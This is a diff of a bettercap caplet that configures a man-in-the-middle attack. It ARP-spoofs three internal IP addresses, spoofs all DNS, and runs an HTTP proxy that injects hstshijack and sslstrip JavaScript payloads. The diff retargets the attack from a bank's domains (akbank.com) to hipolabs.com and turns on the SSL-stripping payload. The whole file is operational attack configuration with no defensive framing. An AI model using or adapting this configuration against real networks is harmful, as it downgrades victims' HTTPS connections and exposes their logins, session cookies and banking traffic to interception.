@@ -1,16 +1,16 @@
-set hstshijack.log             /usr/local/share/bettercap/caplets/hstshijack/ssl.log
-set hstshijack.payload         /usr/local/share/bettercap/caplets/hstshijack/payloads/hstshijack-payload.js
+set hstshijack.log             /usr/local/share/bettercap/caplets_hipo/hstshijack/ssl.log
+set hstshijack.payload         /usr/local/share/bettercap/caplets_hipo/hstshijack/payloads/hstshijack-payload.js
 set hstshijack.ignore          *
-set hstshijack.targets         akbank.com,*.akbank.com
-set hstshijack.replacements    akbank.com,*.akbank.com
-# set hstshijack.custompayloads  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js
+set hstshijack.targets         hipolabs.com,*.hipolabs.com
+set hstshijack.replacements    hipolabs.com,*.hipolabs.com
+set hstshijack.custompayloads  *:/usr/local/share/bettercap/caplets_hipo/hstshijack/payloads/sslstrip.js
 
-set http.proxy.script  /usr/local/share/bettercap/caplets/hstshijack/hstshijack.js
+set http.proxy.script  /usr/local/share/bettercap/caplets_hipo/hstshijack/hstshijack.js
 set net.sniff.verbose  false
 set dns.spoof.all      true
 net.sniff    on
 net.probe on
 dns.spoof    on
 http.proxy   on
-set arp.spoof.targets 192.168.43.228
+set arp.spoof.targets 10.0.15.123,10.0.13.231,10.0.14.152
 arp.spoof on
